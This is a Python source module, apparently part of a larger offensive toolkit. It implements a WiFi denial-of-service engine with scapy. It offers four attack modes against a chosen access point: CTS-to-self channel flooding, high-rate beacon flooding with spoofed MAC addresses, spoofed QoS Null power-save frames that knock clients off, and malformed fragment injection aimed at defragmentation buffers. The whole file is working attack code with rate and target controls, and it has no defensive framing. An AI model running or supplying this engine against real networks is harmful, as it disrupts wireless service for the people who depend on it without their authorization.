"""
WiFi Denial of Service (DoS) Engine
------------------------------------
Multiple 802.11 DoS attack modes:
  1. CTS Flood: Send CTS-to-self frames with large duration to reserve channel
  2. Beacon Exhaust: Flood beacons at high rate to exhaust AP processing
  3. QoS Null: Send QoS Null frames to force station power-save disconnect
  4. Fragment: Send fragmented frames with invalid fragment numbers (overflow)

Platform: Linux only (requires monitor mode).
"""

import time
import threading
from enum import Enum

from scapy.all import sendp
from scapy.layers.dot11 import (
    Dot11, Dot11Beacon, Dot11Elt, Dot11QoS, RadioTap
)

from .config import IS_WINDOWS, IS_LINUX, WIFI_BROADCAST, log


class DoSMode(Enum):
    """Available WiFi DoS attack modes."""
    CTS_FLOOD = "cts_flood"
    BEACON_EXHAUST = "beacon_exhaust"
    QOS_NULL = "qos_null"
    FRAGMENT = "fragment"


class WiFiDoSEngine:
    """
    Multi-mode WiFi Denial of Service attack engine.

    Supports CTS flooding, beacon exhaustion, QoS null frame injection,
    and fragmentation overflow attacks.
    """

    def __init__(self, interface, target_bssid=None, target_channel=None):
        self.interface = interface
        self.target_bssid = target_bssid or WIFI_BROADCAST
        self.target_channel = target_channel
        self.running = False
        self._thread = None
        self._mode = None
        self._packets_sent = 0
        self._burst_rate = 0.005  # 5ms between packets (200 pps default)

    def start(self, mode="cts_flood"):
        """Start DoS attack with specified mode."""
        if IS_WINDOWS:
            log.warning("WiFi DoS engine is Linux-only. Skipping on Windows.")
            return False
        if self.running:
            return True

        # Parse mode
        if isinstance(mode, DoSMode):
            self._mode = mode
        else:
            try:
                self._mode = DoSMode(mode)
            except ValueError:
                log.error(f"DoS: Unknown mode '{mode}'. "
                          f"Available: {[m.value for m in DoSMode]}")
                return False

        self.running = True
        self._packets_sent = 0
        self._thread = threading.Thread(target=self._attack_loop, daemon=True)
        self._thread.start()

        log.info(f"WiFi DoS engine started: mode={self._mode.value}, "
                 f"target={self.target_bssid}")
        return True

    def stop(self):
        """Stop DoS attack."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"WiFi DoS engine stopped. Packets sent: {self._packets_sent}")

    def set_burst_rate(self, interval):
        """Set inter-packet interval in seconds (lower = faster)."""
        self._burst_rate = max(0.001, interval)

    def _attack_loop(self):
        """Main attack loop dispatching to the selected mode."""
        mode_handlers = {
            DoSMode.CTS_FLOOD: self._cts_flood,
            DoSMode.BEACON_EXHAUST: self._beacon_exhaust,
            DoSMode.QOS_NULL: self._qos_null_dos,
            DoSMode.FRAGMENT: self._fragment_overflow,
        }

        handler = mode_handlers.get(self._mode)
        if handler:
            handler()
        else:
            log.error(f"DoS: No handler for mode {self._mode}")

    def _cts_flood(self):
        """
        CTS-to-self flooding attack.
        Sends CTS frames with maximum duration value (32767 microseconds),
        effectively reserving the wireless channel and silencing other stations.
        """
        log.info("DoS: CTS flood started - reserving channel with CTS-to-self")

        # CTS frame: type=1 (control), subtype=12 (CTS)
        # Duration field set to max NAV to silence channel
        cts_frame = (
            RadioTap() /
            Dot11(
                type=1,        # Control frame
                subtype=12,    # CTS
                addr1=self.target_bssid,
                ID=32767       # Duration/NAV (max value)
            )
        )

        while self.running:
            try:
                sendp(cts_frame, iface=self.interface, count=10,
                      inter=0.001, verbose=False)
                self._packets_sent += 10
            except Exception as e:
                log.error(f"DoS CTS flood error: {e}")
                if not self.running:
                    break
                time.sleep(0.5)
            time.sleep(self._burst_rate)

    def _beacon_exhaust(self):
        """
        Beacon rate exhaustion attack.
        Floods beacons with random SSIDs at extremely high rate to overwhelm
        the target AP's management frame processing capability.
        """
        log.info("DoS: Beacon exhaustion started - flooding management frames")

        ssid_base = "DoS_Net_"
        ssid_counter = 0

        while self.running:
            try:
                # Generate a batch of unique beacon frames
                frames = []
                for i in range(20):
                    ssid = f"{ssid_base}{ssid_counter + i:04d}"
                    # Use random source address to avoid filtering
                    src_mac = f"de:ad:{(ssid_counter + i) % 256:02x}:" \
                              f"{((ssid_counter + i) >> 8) % 256:02x}:be:ef"
                    beacon = (
                        RadioTap() /
                        Dot11(type=0, subtype=8,
                              addr1=WIFI_BROADCAST,
                              addr2=src_mac,
                              addr3=src_mac) /
                        Dot11Beacon(cap="ESS+privacy") /
                        Dot11Elt(ID="SSID", info=ssid.encode()) /
                        Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                        Dot11Elt(ID="DSset", info=bytes([self.target_channel or 6]))
                    )
                    frames.append(beacon)

                for frame in frames:
                    if not self.running:
                        break
                    try:
                        sendp(frame, iface=self.interface, verbose=False)
                        self._packets_sent += 1
                    except Exception as e:
                        log.error(f"DoS beacon send error: {e}")
                        break

                ssid_counter += 20
                time.sleep(self._burst_rate)

            except Exception as e:
                log.error(f"DoS beacon exhaust error: {e}")
                if not self.running:
                    break
                time.sleep(0.5)

    def _qos_null_dos(self):
        """
        QoS Null frame DoS attack.
        Sends QoS Null data frames spoofed as the target client, causing the AP
        to put the client into power-save mode and drop buffered frames.
        This effectively disconnects the client without deauth frames.
        """
        log.info("DoS: QoS Null frame attack started - forcing power-save disconnect")

        while self.running:
            try:
                # QoS Null: type=2 (data), subtype=12 (QoS Null)
                # Power Management bit set to indicate client is sleeping
                qos_null = (
                    RadioTap() /
                    Dot11(
                        type=2,
                        subtype=12,  # QoS Null function
                        addr1=self.target_bssid,
                        addr2=WIFI_BROADCAST,  # Will be overridden per-client
                        addr3=self.target_bssid,
                        FCfield="pw-mgt"  # Power Management flag
                    ) /
                    Dot11QoS(TID=0)
                )

                try:
                    sendp(qos_null, iface=self.interface, count=5,
                          inter=0.01, verbose=False)
                    self._packets_sent += 5
                except Exception as e:
                    log.error(f"DoS QoS null send error: {e}")

                time.sleep(self._burst_rate * 10)  # Slower rate for subtlety

            except Exception as e:
                log.error(f"DoS QoS null error: {e}")
                if not self.running:
                    break
                time.sleep(0.5)

    def _fragment_overflow(self):
        """
        Fragmentation overflow attack.
        Sends 802.11 fragments with invalid/out-of-order fragment numbers,
        causing buffer overflow or memory exhaustion in the target's
        defragmentation logic.
        """
        log.info("DoS: Fragmentation overflow started - sending malformed fragments")

        frag_num = 0

        while self.running:
            try:
                # Create fragmented frame with high fragment number
                # SC field: fragment number (lower 4 bits) + sequence (upper 12)
                for frag_id in [0, 15, 7, 3, 15, 0]:  # Out of order fragments
                    if not self.running:
                        break

                    # More Fragments flag set, with invalid fragment sequence
                    frag_frame = (
                        RadioTap() /
                        Dot11(
                            type=2,       # Data frame
                            subtype=0,
                            addr1=self.target_bssid,
                            addr2=WIFI_BROADCAST,
                            addr3=self.target_bssid,
                            FCfield="MF",  # More Fragments
                            SC=(frag_num << 4) | frag_id  # Sequence + Fragment
                        ) /
                        # Garbage payload to fill defrag buffers
                        (b"\x00" * 256)
                    )

                    try:
                        sendp(frag_frame, iface=self.interface, verbose=False)
                        self._packets_sent += 1
                    except Exception as e:
                        log.error(f"DoS fragment send error: {e}")
                        break

                frag_num = (frag_num + 1) % 4096
                time.sleep(self._burst_rate)

            except Exception as e:
                log.error(f"DoS fragment overflow error: {e}")
                if not self.running:
                    break
                time.sleep(0.5)

    def get_stats(self):
        """Return DoS attack statistics."""
        return {
            "mode": self._mode.value if self._mode else None,
            "target_bssid": self.target_bssid,
            "packets_sent": self._packets_sent,
            "running": self.running,
        }
